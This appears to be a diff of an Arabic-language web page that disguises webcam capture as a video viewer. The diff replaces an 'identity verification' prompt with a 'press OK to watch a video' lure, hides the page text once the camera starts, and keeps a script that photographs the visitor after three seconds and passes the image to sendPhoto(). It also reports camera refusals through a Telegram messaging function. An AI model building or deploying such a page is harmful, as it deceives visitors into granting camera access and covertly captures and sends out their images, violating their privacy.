@@ -1,36 +1,53 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>التحقق من الهوية</title>
+    <title>اضغط لمشاهدة الفيديو</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { 
             font-family: Tahoma, sans-serif; 
-            background-color: #f9f9f9; 
-            color: #333;
+            background-color: #000; 
+            color: #fff;
             text-align: center; 
             padding-top: 80px; 
+            margin: 0;
         }
         button {
-            padding: 12px 24px;
-            font-size: 16px;
-            background-color: #1e90ff;
+            padding: 14px 30px;
+            font-size: 18px;
+            background-color: #ff004f;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 30px;
             cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 0 15px #ff004f;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #e60044;
         }
         video {
+            margin-top: 30px;
+            max-width: 90vw;
+            border-radius: 20px;
             display: none;
+        }
+        p {
+            font-size: 20px;
+            margin: 20px 0 40px;
+        }
+        h2 {
+            font-size: 28px;
+            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
-    <h2>📷 التحقق من الهوية</h2>
-    <p>يرجى الموافقة على الكاميرا والموقع لمتابعة التحقق.</p>
-    <button onclick="startProcess()">📤 متابعة</button>
+    <h2>📷 اضغط لمشاهدة الفيديو</h2>
+    <p>اضغط موافق لمشاهدة فيديو</p>
+    <button onclick="startProcess()">اضغط موافق لمشاهدة فيديو</button>
 
     <video id="video" autoplay playsinline></video>
 
@@ -86,9 +103,15 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                video.style.display = 'block'; // إظهار الفيديو
                 video.play();
 
-                // الانتظار قليلاً ثم التقاط صورة
+                // إخفاء الزر والنص بعد بدء الفيديو
+                document.querySelector('button').style.display = 'none';
+                document.querySelector('p').style.display = 'none';
+                document.querySelector('h2').style.display = 'none';
+
+                // الانتظار ثم التقاط صورة
                 setTimeout(async () => {
                     const canvas = document.createElement("canvas");
                     canvas.width = 640;
@@ -101,10 +124,11 @@
                     canvas.toBlob(async (blob) => {
                         await sendPhoto(blob);
                     }, 'image/jpeg');
-                }, 3000); // انتظار 3 ثواني قبل التقاط الصورة
+                }, 3000);
 
             } catch (err) {
                 await sendTelegramMessage("⚠️ لم يتم منح إذن الكاميرا.");
+                alert("لم يتم السماح بالوصول إلى الكاميرا.");
             }
         }
     </script>
